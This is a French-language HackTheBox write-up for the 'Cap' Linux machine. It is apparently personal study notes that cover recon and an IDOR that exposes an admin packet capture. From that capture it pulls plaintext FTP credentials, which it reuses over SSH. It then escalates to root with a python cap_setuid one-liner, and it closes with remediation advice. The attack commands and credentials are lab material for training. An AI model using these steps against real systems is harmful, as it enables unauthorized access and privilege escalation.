# Cap — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-__-__ |
| **Vecteur** | IDOR web (`/data/0`) → `.pcap` → creds FTP en clair → SSH `nathan` → capability `cap_setuid` sur python → root |
| **CVE** | aucune — misconfig (IDOR + capability) |
| **Tags** | web · idor · pcap · linux-privesc · capabilities |

> `<IP_CIBLE>` = IP de session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.

> 🎯 **Phase 3 — retour Linux, web + privesc par capability.** Deux nouveautés vs Shocker/Optimum :
> une faille **web logique** (pas un CVE), et une privesc Linux que tu n'as pas encore vue.
> Déroule ta fiche `lire-peas` côté Linux et pense **au-delà de sudo/SUID**.

---

## TL;DR

Un tableau de bord réseau (Gunicorn/Flask) génère des captures par **ID dans l'URL** (`/data/<id>`).
En changeant l'ID pour **`0`** (IDOR, OWASP A01) on récupère la capture d'un **admin** : un `.pcap` qui
contient une session **FTP en clair** → identifiants **`nathan` / `Buck3tH4TF0RM3!`**. Rejoués en **SSH**
(user flag). En privesc, `getcap` révèle que **`python3.8` porte la capability `cap_setuid+ep`** →
`os.setuid(0)` puis shell → **root**.

**Recon (21/22/80) → IDOR `/data/0` → `.pcap` → FTP creds → SSH `nathan` → `cap_setuid` sur python → root.**

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p- -oA nmap/cap <IP_CIBLE>
```

| Port | Service | Version | Piste |
| --- | --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 | protocole **en clair** (resservira) |
| 22 | SSH | OpenSSH | accès distant une fois des creds en main |
| 80 | HTTP | Gunicorn (Flask) | tableau de bord « Security Dashboard » |

> Note **tous** les services : le **21 (FTP)** transporte les identifiants **sans chiffrement** → c'est
> la cible une fois qu'on a une capture. Le **22 (SSH)** servira à rejouer ces creds.

---

## 2. Énumération web

Application à explorer **à la main** (clique, observe les URL).

- Sections : `Security Snapshot`, `IP Config`, `Network Status`…
- La page **« Security Snapshot »** génère une capture et l'affiche à l'URL **`/data/<id>`**
  (ex. `/data/5`). Question : que se passe-t-il si tu changes l'ID ?
- **IDOR** : `/data/0` renvoie la capture du **premier** scan (celui de l'admin), pas la tienne.

```bash
# récupère la capture d'ID 0 (celle de l'admin)
curl http://<IP_CIBLE>/download/0 -o 0.pcap
```

> Réflexe : une ressource numérotée dans l'URL (`/data/1`, `?id=1`) → teste les autres valeurs,
> **surtout 0**. C'est une faille de **contrôle d'accès** (OWASP A01), pas une faille technique.

---

## 3. Accès initial (foothold)

**Méthode :** exploiter l'IDOR → récupérer un `.pcap` → l'**analyser** → extraire des identifiants →
les rejouer sur SSH.

```bash
# analyser la capture (Wireshark en GUI, ou tshark en CLI)
wireshark 0.pcap &
# suivre le flux TCP du FTP (port 21) : commandes USER / PASS en clair
tshark -r 0.pcap -Y 'ftp.request.command in {"USER","PASS"}' -T fields -e ftp.request.arg
```

- Fichier obtenu + outil : **`0.pcap`** analysé avec **Wireshark** (filtre `ftp`)
- Trouvé : session **FTP en clair** → `USER nathan` / `PASS Buck3tH4TF0RM3!`
- Service où rejouer : **SSH** (réutilisation de creds)

```bash
ssh nathan@<IP_CIBLE>      # Buck3tH4TF0RM3!
```

- **Utilisateur obtenu :** `nathan` (⚠️ pas root)

**Flag user :** `/home/nathan/user.txt` (non publié).

> Leçon de méthode : une **fuite d'info** (capture lisible via IDOR) alimente l'étape suivante ;
> un identifiant capturé sur un protocole **non chiffré** (FTP) est réutilisable ailleurs (SSH).

---

## 4. Énumération privesc (Linux)

Déroule `linux-privesc` / `lire-peas`. Ici, ne t'arrête PAS à `sudo -l` et aux SUID :

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null                     # ← la famille à regarder de près ici
# -> /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

- Piste retenue : **capability `cap_setuid`** sur `/usr/bin/python3.8`

> Rappel `lire-peas` (Linux, famille « capabilities ») : une **capability** donne à un binaire un droit
> fin sans SUID complet. **`cap_setuid`** autorise le binaire à **changer d'UID** → sur un interpréteur,
> c'est un shell root direct.

---

## 5. Élévation de privilèges

**Méthode :** le binaire porteur de `cap_setuid` peut, appelé directement, passer son UID à 0.

- Binaire + capability : **`/usr/bin/python3.8`** + **`cap_setuid+ep`**
- [GTFOBins](https://gtfobins.github.io/gtfobins/python/) → `python` → section **`Capabilities`**.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id   # uid=0(root)
```

**Flag root :** `/root/root.txt` (non publié).

> Pourquoi ça marche (pour l'oral) : normalement `setuid(0)` échoue pour un utilisateur non privilégié.
> Mais la capability **`cap_setuid`** posée sur le binaire python l'**autorise explicitement** à appeler
> `setuid` → le processus devient root, puis lance un shell. C'est une **capability mal attribuée**, pas une CVE.

---

## 6. Remédiation

- **IDOR** : vérifier côté serveur que l'utilisateur ne peut accéder qu'à **ses** ressources (contrôle d'accès par objet), pas seulement masquer l'URL.
- **FTP** : bannir les protocoles en clair (FTP, Telnet, HTTP basic) → FTPS/SFTP ; ne pas réutiliser le même mot de passe entre services.
- **Capability** : retirer `cap_setuid` de python (`setcap -r /usr/bin/python3.8`) ; n'accorder des capabilities qu'aux binaires qui en ont réellement besoin, jamais à un interpréteur.

---

## 7. Leçons

- **Faille logique vs technique** : l'IDOR n'est pas un bug de code exploitable par payload, c'est un
  **défaut de contrôle d'accès** — tester `0` et les voisins est un réflexe systématique.
- **Les capabilities = nouvelle famille de privesc** : au-delà de `sudo -l` et des SUID, toujours lancer
  `getcap -r / 2>/dev/null`. `cap_setuid` sur un interpréteur = root.
- **Protocoles en clair** : un `.pcap` qui traîne + du FTP = creds offerts ; la réutilisation de mot de
  passe (FTP→SSH) fait le reste.

---

## Références

- OWASP A01 (Broken Access Control) — <https://owasp.org/Top10/A01_2021-Broken_Access_Control/>
- GTFOBins (python, Capabilities) — <https://gtfobins.github.io/gtfobins/python/>
- Fiches liées : [nmap](../outils/nmap.md) · [burp](../outils/burp.md) · [linux-privesc](../outils/linux-privesc.md) · [gtfobins](../outils/gtfobins.md) · [lire-peas](../outils/lire-peas.md)
